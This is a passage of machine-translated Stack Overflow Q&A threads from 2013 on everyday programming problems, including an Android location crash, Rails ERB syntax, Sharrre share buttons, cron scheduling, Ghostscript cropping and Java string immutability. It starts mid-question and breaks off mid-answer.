和我的测试代码

```
public class MainActivity extends FragmentActivity implements LocationListener{

private GoogleMap googleMap;
private LatLng source;

@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

     int status = GooglePlayServicesUtil.isGooglePlayServicesAvailable(getBaseContext());

        if(status!=ConnectionResult.SUCCESS){
            int requestCode = 10;
            Dialog dialog = GooglePlayServicesUtil.getErrorDialog(status, this, requestCode);
            dialog.show();
        }else{
            SupportMapFragment fm = (SupportMapFragment)getSupportFragmentManager().findFragmentById(R.id.map);

            googleMap = fm.getMap();

            googleMap.setMyLocationEnabled(false);

            LocationManager locManager = (LocationManager) getSystemService(LOCATION_SERVICE);

            Criteria criteria = new Criteria();

            String provider = locManager.getBestProvider(criteria, true);

            Location loc = locManager.getLastKnownLocation(provider);

            if(loc!=null){
                onLocationChanged(loc);
            }
            source = new LatLng(loc.getLatitude(), loc.getLongitude());
            //makeUrl = new MakeUrl(source, destination);
            //String url = makeUrl.makeLocationUrl();
            googleMap.moveCamera(CameraUpdateFactory.newLatLng(source));
            googleMap.animateCamera(CameraUpdateFactory.zoomTo(15));
        }
}

@Override
public boolean onCreateOptionsMenu(Menu menu) {
    // Inflate the menu; this adds items to the action bar if it is present.
    getMenuInflater().inflate(R.menu.activity_main, menu);
    return true;
}

@Override
public void onLocationChanged(Location arg0) {
    // TODO Auto-generated method stub

}

@Override
public void onProviderDisabled(String arg0) {
    // TODO Auto-generated method stub

}

@Override
public void onProviderEnabled(String arg0) {
    // TODO Auto-generated method stub

}

@Override
public void onStatusChanged(String arg0, int arg1, Bundle arg2) {
    // TODO Auto-generated method stub

} 
```

}

我在 NOTE 2 上得到的堆栈跟踪

```
 02-17 13:03:23.135: D/dalvikvm(9527): Late-enabling CheckJNI
02-17 13:03:23.170: E/Trace(9527): error opening trace file: No such file or directory (2)
02-17 13:03:23.345: D/dalvikvm(9527): GC_CONCURRENT freed 179K, 6% free 12453K/13191K, paused 2ms+1ms, total 33ms
02-17 13:03:23.345: D/dalvikvm(9527): WAIT_FOR_CONCURRENT_GC blocked 26ms
02-17 13:03:23.575: D/dalvikvm(9527): GC_CONCURRENT freed 279K, 7% free 12634K/13511K, paused 12ms+1ms, total 24ms
02-17 13:03:23.665: D/dalvikvm(9527): GC_CONCURRENT freed 276K, 7% free 12862K/13703K, paused 2ms+12ms, total 29ms
02-17 13:03:23.705: D/AbsListView(9527): Get MotionRecognitionManager
02-17 13:03:23.740: D/dalvikvm(9527): GC_CONCURRENT freed 194K, 6% free 13206K/13959K, paused 2ms+2ms, total 20ms
02-17 13:03:23.740: D/dalvikvm(9527): WAIT_FOR_CONCURRENT_GC blocked 9ms
02-17 13:03:23.745: D/dalvikvm(9527): WAIT_FOR_CONCURRENT_GC blocked 9ms
02-17 13:03:23.760: D/AndroidRuntime(9527): Shutting down VM
02-17 13:03:23.760: W/dalvikvm(9527): threadid=1: thread exiting with uncaught exception (group=0x41c802a0)
02-17 13:03:23.760: E/AndroidRuntime(9527): FATAL EXCEPTION: main
02-17 13:03:23.760: E/AndroidRuntime(9527): java.lang.RuntimeException: Unable to start activity ComponentInfo{com.example.mm/com.example.mm.MainActivity}: java.lang.NullPointerException
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2100)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread.handleLaunchActivity(ActivityThread.java:2125)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread.access$600(ActivityThread.java:140)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread$H.handleMessage(ActivityThread.java:1227)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.os.Handler.dispatchMessage(Handler.java:99)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.os.Looper.loop(Looper.java:137)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread.main(ActivityThread.java:4898)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at java.lang.reflect.Method.invokeNative(Native Method)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at java.lang.reflect.Method.invoke(Method.java:511)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1008)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:775)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at dalvik.system.NativeStart.main(Native Method)
02-17 13:03:23.760: E/AndroidRuntime(9527): Caused by: java.lang.NullPointerException
02-17 13:03:23.760: E/AndroidRuntime(9527):     at com.example.mm.MainActivity.onCreate(MainActivity.java:82)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.Activity.performCreate(Activity.java:5191)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.Instrumentation.callActivityOnCreate(Instrumentation.java:1094)
02-17 13:03:23.760: E/AndroidRuntime(9527):     at android.app.ActivityThread.performLaunchActivity(ActivityThread.java:2064)
02-17 13:03:23.760: E/AndroidRuntime(9527):     ... 11 more
02-17 13:03:23.955: D/dalvikvm(9527): GC_CONCURRENT freed 233K, 6% free 13394K/14215K, paused 14ms+1ms, total 44ms 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T17:38:50.820

似乎该位置提供者没有最后一个已知位置。如果该位置提供者从未进行过位置修复，则可能会发生这种情况。只需尝试更好地解决 loc == null 的情况。

# ruby-on-rails - 在 .erb 子句中分配一个类，“语法错误，意外 tASSOC，期待 tCOLON2”

> ID：14916488
> 
> 赞同：1
> 
> 时间：2013-02-16T23:52:49.427
> 
> 标签：ruby-on-rails

全部，尝试在 erb 文件中分配类时出现以下语法错误：

```
SyntaxError in Posts#index

Showing [..]/app/views/posts/_post.html.erb where line #5 raised:

[..]/app/views/posts/_post.html.erb:5: syntax error, unexpected tASSOC, expecting tCOLON2 or '[' or '.'
...append= ( post.title, :class => 'my-custom-class' );@output_...
...     

                      ^ 
3:   <td>
4:     <div>
5:       <%= post.title, :class => 'my-custom-class' %>
6:     </div>
7: </td> 
```

我可以将类添加到`<div>`- 即`<div class='my-custom-class'> .. </div>`，但是没有更优雅的方式，没有 div，将类分配嵌入到 erb 子句中？

想法在这里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:03:46.010

```
<%= content_tag, :div, post.title, :class => 'my-custom-class' %> 
```

[http://api.rubyonrails.org/classes/ActionView/Helpers/TagHelper.html#method-i-content_tag](http://api.rubyonrails.org/classes/ActionView/Helpers/TagHelper.html#method-i-content_tag)

# javascript - 分享 Google+ 按钮问题

> ID：14916490
> 
> 赞同：2
> 
> 时间：2013-02-16T23:53:00.407
> 
> 标签：javascript, html, css, button

我正在尝试将共享按钮添加到我的网站，并且我选择使用“sharrre.com”脚本对于 twitter 和 Facebook 来说一切正常，但对于 google+ 按钮，它没有显示
这是我的代码：

```
$('#twitter').sharrre({
  share: {
    twitter: true
  },
  enableHover: false,
  enableTracking: true,
  buttons: { twitter: {via: '_JulienH'}},
  click: function(api, options){
    api.simulateClick();
    api.openPopup('twitter');
  }
});

$('#facebook').sharrre({
  share: {
    facebook: true
  },
  enableHover: false,
  enableTracking: true,
  click: function(api, options){
    api.simulateClick();
    api.openPopup('facebook');
  }
});
$('#googleplus').sharrre({
  share: {
    googlePlus: true
  },
  enableHover: false,
  enableTracking: true,
  click: function(api, options){
    api.simulateClick();
    api.openPopup('googlePlus');
  }
}); 
```

完整代码见我的[JSfiddle](http://jsfiddle.net/L5ZpF/)
我跟着[这个演示](http://sharrre.com/example1.html)

那么谁能告诉我为什么没有出现 Google+ 按钮？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-09-18T14:32:48.850

您需要添加正确的*cURL url 参数*。

```
$('#google').sharrre({
  share: {
        googlePlus: true
  },
  urlCurl: '/ts-includes/sharrre.php',
  template: '<a class="box" href="#"><div class="count" href="#">{total}</div><div class="share"><span></span>+1</div></a>',

  enableHover: false,
  enableTracking: true,
  click: function(api, options){
        api.simulateClick();
        api.openPopup('googlePlus');
  }
}); 
```

对于我正在使用的 WordPress：`urlCurl: '<?php echo get_template_directory_uri() ?>/theme-includes/sharrre.php'`

请记住`sharrre.php`在您的服务器/本地主机上的正确位置。

问题在这里-> [https://github.com/Julienh/Sharrre/issues/44](https://github.com/Julienh/Sharrre/issues/44)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-17T00:18:53.170

您缺少一个文件。该代码正在寻找 sharrre.php（包含在 sharrre 的下载中）

在我运行的测试中，它在您拥有使用它的文件的同一目录中查找它（或者您可以只包含它）。授予对该文件的访问权限将解决您的问题。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-17T01:13:11.643

我想出了问题对于我的 googleplus 脚本，我忘了添加`urlCurl`选项。
这是 Google+ 旧功能：

```
 $('#googleplus').sharrre({
  share: {
    googlePlus: true
  },
  enableHover: false,
  enableTracking: true,
  click: function(api, options){
    api.simulateClick();
    api.openPopup('googlePlus');
  }
}); 
```

这是新的：

```
 $('#googleplus').sharrre({
  share: {
    googlePlus: true
  },
  enableHover: false,
  enableTracking: true,
  urlCurl: '',
  click: function(api, options){
    api.simulateClick();
    api.openPopup('googlePlus');
  }
}); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-04T05:37:24.410

很容易错过但非常重要的关键是要记住将 sharrre.php 文件放置在与上面 Stuart 提到的 sharrre.js 文件相同的位置。希望我不会被欺骗……这对我有帮助。

我尝试了一切都无济于事，直到我将 sharrre.php 与 .js 文件放在同一个文件夹中。

# github - 在 Github 上发布项目版本（二进制/源包）？

> ID：14916492
> 
> 赞同：6
> 
> 时间：2013-02-16T23:53:28.030
> 
> 标签：github, release

是否`Github`提供为项目创建发布页面的选项？我注意到它可以让您为源创建不同的标签，但找不到可以添加发行说明、构建包和所有这些的 UI/Web。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-02-16T23:58:20.957

[2013 年 7 月 2d 更新](https://github.com/blog/1547-release-your-software)，您现在可以**定义发布**。

> **Releases**，将软件发送给最终用户的工作流程。
> 发布是一流的对象，带有变更日志和二进制资产，提供了 Git 工件之外的完整项目历史。可以从存储库的主页访问它们：

![主页](../Images/b7284af160e36f640c2c57e81427521d.png)

*   版本附有版本说明和下载软件或源代码的链接。
*   遵循许多 Git 项目的约定，发布与 Git 标签相关联。您可以使用现有标签，也可以让版本在发布时创建标签。
*   **您还可以将二进制资产（例如编译的可执行文件、缩小的脚本、文档）附加到 release**。发布后，任何可以查看存储库的人都可以使用发布详细信息和资产。

![发布](../Images/f1da5a105d8f216b1b82f7b0706dce2a.png)

它取代了[旧的二进制上传服务](https://stackoverflow.com/q/6978954/6309)，该服务[于 2012 年 12 月被删除](https://github.com/blog/1302-goodbye-uploads)！

* * *

初步答案（2012 年 2 月）

我不知道：这非常依赖于每种项目语言和发布管理过程。

一种方法是使用`README.md`发布这些信息，或者将发布说明链接为单独的文档。
关于链接的一个很好的细节是它可以在几周后成为一个*相对*链接（请参阅博客文章“[标记文件中的相对链接](https://github.com/blog/1395-relative-links-in-markup-files)”）。

# git - 无法从不同用户的仓库克隆

> ID：14916496
> 
> 赞同：0
> 
> 时间：2013-02-16T23:53:57.453
> 
> 标签：git, mercurial

在我的本地，有两个用户帐户。

1) 用户 2) Hadoop

我主要在 User 上开发代码，然后复制到 hadoop 中使用它。

因此，我想，与其走这条漫长的路，也许我可以将代码推送到回购并拉到另一端

虽然我能够将代码从用户推送到 repo

但是当我尝试从 hadoop 中提取代码时。我收到这个错误？

```
remote: Permission denied (publickey).
abort: no suitable response from remote hg! 
```

虽然，我正面临来自 mercurial 的问题，但 git 用户之间可能也存在一些重叠。因此标记他们，但如果有人认为，问题并不适用于他们，请随意取消标记。

有什么线索吗？谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:24:04.470

那是 ssh 告诉您您的 hadoop 用户无权访问您的 mercurial repo 位于后面的 ssh 服务器。无论您为设置密钥`user`所做的任何事情都为`hadoop`.

# arduino - arduino mega 从引脚中汲取更多电流

> ID：14916501
> 
> 赞同：0
> 
> 时间：2013-02-16T23:54:45.423
> 
> 标签：arduino

我有 Arduino Mega，
我需要的不仅仅是`40mA`引脚提供的电源来为我的直流电机供电，
有没有办法将它们`40mA`增加到更多`100mA`？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T00:04:51.907

这不是一个 SO 问题，因为它与编程没有任何关系……但无论如何：您不想直接从 Arduino 驱动电机。除了缺乏足够的动力外，电机还会产生尖峰信号和电子噪音，这会影响 Ardunio。

网上有很多教程，这里有[一个](http://bildr.org/2011/03/high-power-control-with-arduino-and-tip120/)。如果您希望能够反转方向，那么您将使用所谓的[H-Bridge](http://en.wikipedia.org/wiki/H_bridge)。

* * *

## 回答 #2

> 赞同：-2
> 
> 时间：2013-02-16T23:58:35.997

您可以将 1 个引脚的直流电机连接到每个端子（+ve，-ve），而不是连接 2 个或更多（以增加电流）

假设一个引脚给出`40mA`并且您需要`100mA`，那么您可以将直流电机的每个端子连接到 arduino 提供的 3 个引脚`120mA`

# svn - 如何与本地中继合并？

> ID：14916505
> 
> 赞同：0
> 
> 时间：2013-02-16T23:54:58.040
> 
> 标签：svn, merge

好的..这听起来很容易，但我无法通过谷歌搜索或搜索 stackoverflow 找到它。

我有一个树干并创建了它的一个分支。

我对主干进行了一些更改并提交了更改。我知道我能做到

**svn merge url-of-the-trunk**进行合并，但我可以在本地进行吗？我试过**svn merge ../../trunk**，但看起来它不起作用。

当我在本地拥有所有更改时，为什么我需要从服务器下载更改？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T05:35:35.210

SVN 不在磁盘上存储历史记录。由于合并分析历史，它必须有权访问服务器。

磁盘上的工作副本仅存储每个项目的基本版本，以便能够检测到修改。

因此，磁盘上主干的工作副本没有足够的信息进行合并。

# ios - 从 UITableView 中的静态单元格单击时，使 UITextView 全屏显示

> ID：14916506
> 
> 赞同：1
> 
> 时间：2013-02-16T23:54:58.623
> 
> 标签：ios, uitableview, uiviewcontroller

ViewController 由一个带有静态（自定义）单元格的 TableView 组成。其中一行包含一个 UITextView，它显示 2 行文本（作为预览）。当用户点击它时，它会打开一个 UITextView 填满全屏。

```
else if (indexPath.row == 3) {
    static NSString *countryRegionCellID = @"NotesCell";
    NotesCell *cell = (NotesCell *)[tableView dequeueReusableCellWithIdentifier:countryRegionCellID];
    if (!cell) {
        NSArray* topLevelObjects = [[NSBundle mainBundle] loadNibNamed:countryRegionCellID owner:self options:nil];
        for (id currentObject in topLevelObjects) {
            if ([currentObject isKindOfClass:[NotesCell class]]) {
                cell = (NotesCell *)currentObject;
                break;
            }
        }
    }
    [self drawBorder:cell];
    [self drawPersonalNotes:cell];
    return cell;
} 
```

UITextView 委托调用：

```
- (BOOL)textViewShouldBeginEditing:(UITextView *)textView
{
    NSLog(@"textViewShouldBeginEditing");
    [textView becomeFirstResponder];    
    CGRect r = [[UIScreen mainScreen] bounds];
    [textView setFrame:r];
    return YES;
}
- (void)textViewDidBeginEditing:(UITextView *)textView
{
    NSLog(@"textViewDidBeginEditing");
} 
```

由于静态单元格的定义高度为 44，因此 UITextView 仅填充单元格而不是全屏。我是否在表格视图之上引入了一个新的视图控制器？谢谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T00:20:33.460

只需选择一个新的 vc，它只包含一个简单的 textview，但是你希望它看起来。

完成后，通过使用该属性访问它，将该文本分配给您希望从 tableView 中获得的任何`presentingViewController`属性。很好走。

# javascript - 用于 cron 作业的 Nodejs

> ID：14916507
> 
> 赞同：1
> 
> 时间：2013-02-16T23:54:59.993
> 
> 标签：javascript, node.js, cron

我有一个主干应用程序，用户可以在其中进行预定事件。对于这些事件，我假设我需要使用某种类型的 cron 调度。每天大约有 100 个工作。

据我了解，cpanel 将 php 用于 crob 作业（或者是吗？）无论哪种方式我都不想使用 php。

**是否可以让 nodejs 进行某种类型的调度，它将在未来相当长的时间内在一天中的预定时间运行特定事件（在本例中为 ajax 帖子）？**

也不要与从现在开始的特定小时内执行某些方法的计时器混淆。2012 年 2 月 25 日星期一下午 4 点做“xyz”的一个更好的例子

我还想知道如果服务器重新启动，一切都会重置。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-02-17T00:12:35.717

Cron 可以运行服务器/计算机理解的任何脚本或程序

在这种情况下（如果我知道 node.js 正确），您可以在 dev/null 中执行 wget 以在您的 node.js 服务器上运行应用程序

Cron 的工作原理是这样的：

```
#*     *     *   *    *        command to be executed
#-     -     -   -    -
#|     |     |   |    |
#|     |     |   |    +----- day of week (0 - 6) (Sunday=0)
#|     |     |   +------- month (1 - 12)
#|     |     +--------- day of        month (1 - 31)
#|     +----------- hour (0 - 23)
#+------------- min (0 - 59) 
```

示例 Web 脚本运行： */15 * * * * wget [http://example.com/example.js](http://example.com/example.js) -qO /dev/null

这意味着每十五分钟（或类似的东西通常是 ^^） 15 * * * * 表示每小时过去 15 分钟

# javascript - swfobject 不适用于 Chrome 中的 https

> ID：14916508
> 
> 赞同：6
> 
> 时间：2013-02-16T23:55:13.323
> 
> 标签：javascript, flash, google-chrome, https, swfobject

我正在尝试通过以下 javascript 代码将 swf 文件嵌入到页面（[谷歌应用引擎页面）：](http://radmahdi.appspot.com/facebook/userstatusweb/index.html)

```
 <script type="text/javascript">
        //This example uses dynamic publishing with swfObject. Login is handled in the swf

        //Note we are passing in attribute object with a 'name' property that is same value as the 'id'. This is REQUIRED for Chrome/Mozilla browsers           
        swfobject.embedSWF("loader.swf", "flashContent", "640", "480", "10.2", null, null, null, {name:"flashContent"});            

        //REST OF THE CODE
    </script> 
```

它在[HTTP上正常工作，但内容在](http://radmahdi.appspot.com/facebook/userstatusweb/index.html)[HTTPS](https://radmahdi.appspot.com/facebook/userstatusweb/index.html)上不工作。我用谷歌搜索了很多，但我没有找到解决方案。我需要为 Secure Canvas URL 使用 HTTPS 来创建 facebook 应用程序。正如您在下面的评论中看到的那样，https 可以在 safari 上运行，但不能在**Chrome**上运行。

任何想法将不胜感激。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2013-02-21T18:36:13.620

我可以看到[https://radmahdi.appspot.com/facebook/userstatusweb/index.html](https://radmahdi.appspot.com/facebook/userstatusweb/index.html)现在正在为您工作，一旦您按照我在评论中的建议将 swfobject 的链接从 HTTP 更改为 HTTPS :)

你可以做

> //ajax.googleapis.com/ajax/libs/swfobject/2.2/swfobject.js

作为您的链接，在这种情况下，使用的协议将与加载的页面相关。这可能更整洁。

如果您对解决方案感到满意，请将问题标记为已回答。

# css - Twitter Bootstrap 中的 typeahead 下拉菜单是什么类 id

> ID：14916509
> 
> 赞同：0
> 
> 时间：2013-02-16T23:55:21.633
> 
> 标签：css, twitter-bootstrap

所以我在我的网站上使用 twitter bootstrap 并使用我购买的 css 模板。不幸的是，当使用 typeahead 下拉菜单时，下拉菜单上的悬停/聚焦选项太暗并且遮盖了我的文本。文本是黑色的，我的悬停/焦点上的背景是非常深的灰色，所以文本是不可恢复的

我尝试修改 dropdown-menu .active > a:hover 和几乎所有我可以看到的下拉菜单的颜色属性，但这并没有改变文本颜色。我一定错过了一些简单的东西

另外，当我尝试单击它以选择 chrome 中的检查元素时，不幸的是它消失了

我将不胜感激任何帮助

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-17T01:03:10.717

这看起来对你来说是一个有希望的开始：http: [//jsfiddle.net/panchroma/SDLpt/](http://jsfiddle.net/panchroma/SDLpt/)

悬停背景实际上是一个渐变。我已将默认悬停背景更改为#aaa，并将默认悬停文本颜色更改为红色，一切看起来都很好。

***CSS***

```
.dropdown-menu > .active > a, .dropdown-menu > .active > a:hover, .dropdown-menu > .active > a:focus {
 color: red;
 text-decoration: none;
 outline: 0;
 background-color: #aaa;
 background-image: -moz-linear-gradient(top, #aaa, #aaa);
 .....
 } 
```

祝你好运！

# png - 如何将画布部分从 Ghostscript 打印结果裁剪为 PNG

> ID：14916513
> 
> 赞同：1
> 
> 时间：2013-02-16T23:55:33.100
> 
> 标签：png, barcode, crop, ghostscript

我正在使用Pure PostScript库[中的 Barcode Writer打印条形码。](https://github.com/bwipp/postscriptbarcode)

除了画布的结果大小之外，我想出了一切。我用这个命令调用 Gostscript

`-dSAFER -dBATCH -dNOPAUSE -r350 -sDEVICE=pnggray -dTextAlphaBits=4 -sOutputFile=test.png barcode_with_sample.ps`

我打电话的barcode_with_sample.ps里面

`20 755 moveto (2001010042569) (includetext) /ean13 /uk.co.terryburton.bwipp findresource exec showpage`

一切都如我所愿，但结果文件是**2975x3850**。我只需要左上角的**600x220**。

即使生成输出也是相当资源密集型的，因为它的文件非常大。

知道如何只获取画布的确切部分而不是整个页面吗？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-17T06:32:57.857

您可以使用 -dDEVICEWIDTHPOINTS 和 -dDEVICEHEIGHTPOINTS 设置页面大小（一英寸有 72 个点），但您需要将 20 755 moveto 更改为 20 10 moveto。755 大约等于 10.5 英寸，因此当您将页面缩小 0.629 英寸高（45.26 点/220 像素）时，755 将离开页面 10 英寸。将 20 10 moveto 设置为 20 5 moveto 会将其向下移动一点，而 20 15 moveto 会将其向上移动一点。

```
gswin32c -dDEVICEWIDTHPOINTS=123.43 -dDEVICEHEIGHTPOINTS=45.26  -dSAFER -dBATCH -dNOPAUSE -r350 -sDEVICE=pnggray -dTextAlphaBits=4 -sOutputFile=test.png trash.ps 
```

# php - Like 函数 - 检索和传递值

> ID：14916515
> 
> 赞同：0
> 
> 时间：2013-02-16T23:55:47.700
> 
> 标签：php, mysql

我正在尝试创建一个like 函数，但是我在将like id 分配给comment id 时遇到了问题。

代码：

索引.PHP

```
include "includes/db.php";
include "comment.class.php";

    .....
    .....

    $comment = array();

    $result = mysql_query("SELECT * FROM box");

    while ($rows = mysql_fetch_assoc($result)) {

        $comment[] = new Comment($rows);

    }

    foreach ($comment as $c) {

        echo $c->createComment();

    }

            <div id="addCommentArea">
                <p>Add a Comment</p>
                <form id="addCommentForm" method="post" action="">
                    <div>
                        <label for="name">Name</label>
                        <input type="text" name="name" id="name" />

                        <label for="body">Comment Body</label>
                        <textarea name="body" id="body" cols="30" rows="5"></textarea>

                        <input type="submit" id="submit" value="Submit" />
                    </div>
                </form>
            </div>

        </div>

        <script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js"></script>
        <script type="text/javascript" src="script.js"></script> 
```

COMMENT.PHP

```
.....
.....

class Comment

{

    private $data = array();

public function __construct($row)
{
    //  The constructor
    $this->data = $row;                   
    }

    public function createComment()

    {

    $d = &$this->data;

            $link_open = '';
        $link_close = '';        

    return "<div class='comment'>
                <div class='username'>".$link_open.$d['name'].$link_close."</div>
                <p>".$d["body"]."</p>
              <a href='' id='$comment_id' class='like_button'><img src='thumbs_up.png'/></a>&nbsp;<span class='like_show$comment_id'
style='font-weight:bold;font-family:Georgia, Times New Roman, Times, serif;fontsize:12px;position:relative;top:-2px;'>$like_count</span>
            </div>";

    }

    } 
```

所以我试图在这里传递comment_id和like_count：

```
<a href='' id='$comment_id' class='like_button'><img src='thumbs_up.png'/></a>&nbsp;<span class='like_show$comment_id' style='font-weight:bold;font-family:Georgia, Times New Roman, Times, serif;fontsize:12px;position:relative;top:-2px;'>$like_count</span> 
```

我试图添加一个while循环，遍历表格并获取comment_id。但是我不能将 return 放在 while 循环中，因为那样我只会得到一个结果（所以每个评论的点赞按钮将获得相同的 id，如果我喜欢一个评论，所有其他评论都会被喜欢）。如果我只是创建一个 while 循环并将结果放入一个数组中，那么我也无法在 comment_id 中传递它们来为每个评论打印点赞按钮。

我还尝试为like 按钮创建一个单独的函数，从第一个函数（createComment）获取comment_id 并将其传递给第二个函数（比如说''likeComment''）。它效果不佳，但我不确定我是否做得对。如何将值从一个函数传递到另一个函数？有没有其他方法可以获得我想要的价值？

有任何想法吗？解决方案可能很简单，但我真的很努力。一切正常，我非常接近让评论框正常工作。

任何帮助将非常感激

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T00:07:47.937

为了在对象的方法之间共享数据，您应该在每个函数中以 $this->variable 名称分配/访问变量。我不确定这是否正是您要寻找的...

```
class myClass {
    public $test_var;

    function one () {
        $this->test_var = 'a string'; // sets the value
    }

    function two() {
        echo $this->test_var; // prints 'a string'
    }
} 
```

# python - Python跳过我的for循环

> ID：14916517
> 
> 赞同：2
> 
> 时间：2013-02-16T23:56:50.590
> 
> 标签：python, loops, for-loop

首先请注意，我是 Python 的初学者。在 ArcGIS 环境中学习当前处理 Python 的课程。我当前的项目是一个简单的程序，用于创建文件并将其他文件复制到其中。然而，部分任务是让 print 语句在它发生时说明正在发生的事情，例如最终的 print 语句应该如下所示：

处理面要素类....

处理要素类 >> 建筑

字段信息：

```
 etc. 
```

这是我应该这样做的一小部分代码：

```
pointlist = arcpy.ListFeatureClasses("*", "Point")
print "Processing Point FeatureClasses..."
for pl in pointlist:
    arcpy.MakeFeatureLayer_management(pl, "Point" + 1)
    pointlayer = arcpy.SelectLayerByLocation_management(pl, "intersect", MapGridID)
    pointcount = int(arcpy.GetCount_management(pointlayer).getOutput(0))
    if pointcount >= 1:
        arcpy.CopyFeatures_management(pointlayer, OutputGDB)
    for pl in pointlist:
        print "Processing FeatureClass:" + pl
        pointfield = arcpy.ListFields()
        for pf in pointfield:
            print "Field Name:" + pf 
```

出现的问题是它打印了第一个打印语句“Processing Point FeatureClasses”，但不执行其余部分，然后跳到我的下一部分代码并执行它。知道为什么吗？抱歉，如果我的格式或措辞不正确/听起来很奇怪。谢谢你。

*编辑*

我也给我的教授发了电子邮件，寻求一些指导，他写回了我上面代码块的一个稍微编辑过的版本。我现在可以打印除点场打印语句之外的所有内容，这些语句现在被跳过了。这是代码：

```
pointlist = arcpy.ListFeatureClasses("*", "Point")
print "Processing Point FeatureClasses...\n"
i = 1
for pl in pointlist:
    print "Processing FeatureClass: " + pl
    featlayernamepoint = "Point" + str(i)
    arcpy.MakeFeatureLayer_management(pl, featlayernamepoint)
    arcpy.SelectLayerByLocation_management(featlayernamepoint, "intersect",   featurelayerMG2)
    pointcount = int(arcpy.GetCount_management(featlayernamepoint).getOutput(0))
    if pointcount >= 1:
        arcpy.CopyFeatures_management(featlayernamepoint, OutputGDB)
        pointfield = arcpy.ListFields(featlayernamepoint)
        for pf in pointfield:
            print "Field Name: " + pf.name
    i += 1 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-17T10:40:55.990

您忘记将点传递给 ListFields()

```
pointfield = arcpy.ListFields(pl)
for pf in pointfield:
      print "Field Name:" + pf.name 
```

# java - 通过引用/值传递的 Java 字符串不可变

> ID：14916520
> 
> 赞同：6
> 
> 时间：2013-02-16T23:57:26.660
> 
> 标签：java

嗨，我正在为我的 scja 考试而学习，并且有一个关于通过 ref/value 传递的字符串以及它们如何不可变的问题。以下代码输出“abc abcfg”。

我想知道为什么会这样？我不明白方法 f 内部发生了什么。字符串是按值传递的，所以它肯定应该在方法内更改为“abcde”吗？因为如果 b+="fg" 附加到字符串，为什么它在方法内不起作用？

谢谢！

```
public class Test {

    public static void main(String[] args){
        String a =new String("abc");
        String b = a;
        f(b);
        b+="fg"
        System.out.println(a + " " + b);
    }

    public static void f(String b){
        b+="de";
        b=null;
    }
} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-02-17T00:01:33.090

`b+="de";`函数中的行`void f(String b)`创建了一个全新的对象，`String`该对象不会影响`main`函数中的对象。

因此，当我们说不**可变**`String`时，意味着对对象的*任何*更改都将导致创建一个全新的对象***`String``String`***

 ***```
public class Test {
    public static void main(String[] args){
        String a =new String("abc");

        String b = a; // both a & b points to the same memory address

        f(b); // has no effect

        // b still has the value of "abc"
        b+="fg" // a new String object that points to different location than "a"

        System.out.println(a + " " + b); // should print "abc abcfg" 
    }

 public static void f(String b){
    b+="de";  // creates a new object that does not affect "b" variable in main
    b=null;
 }
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-02-17T00:00:20.093

在您的方法`f()`中，您正在为参数分配一个新的 String `b`，但参数就像局部变量一样，因此为它们分配一些东西对方法之外的任何东西都没有影响。这就是为什么你传入的字符串在方法调用之后没有改变的原因。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2013-02-17T00:02:06.460

这行代码：

```
b += "de"; 
```

大致翻译为：

```
b = b + "de"; 
```

它创建了一个新字符串并将其存储在局部变量“b”中。无论如何，方法外的引用都不会因此而改变。在尝试理解这种方式如何/为什么这样工作时，需要记住几件关键的事情。

1.  在 Java 中，所有方法参数都是按值传递的。
2.  方法有一个本地堆栈，其中存储了所有数据，包括方法参数。

当您将新对象分配给传递给方法的变量时，您只是将本地堆栈中的地址替换为创建的新对象的地址。方法之外的实际对象地址保持不变。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-02-17T00:01:10.963

当您将 String 传递给方法时，它会在方法中创建一个新的 String 对象。如果您在方法中添加 println 语句，如下所示：

```
public static void f(String b){
    b+="de";
    System.out.println(b);
    b=null;
} 
```

您将看到输出“abcde”。

但是，一旦您退出该方法，您就会回到未更改的*原始*对象。因此，将 fg 附加到它只会产生一个包含“abcfg”的新字符串 (b)。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-10-05T20:04:33.273

当您说 b+="de" 之类的内容时，您创建了一个新的 String 对象

就像说 b = new String(b+"de");

如果您真的想保留传入的值，请使用这样的 stringBuilder：

```
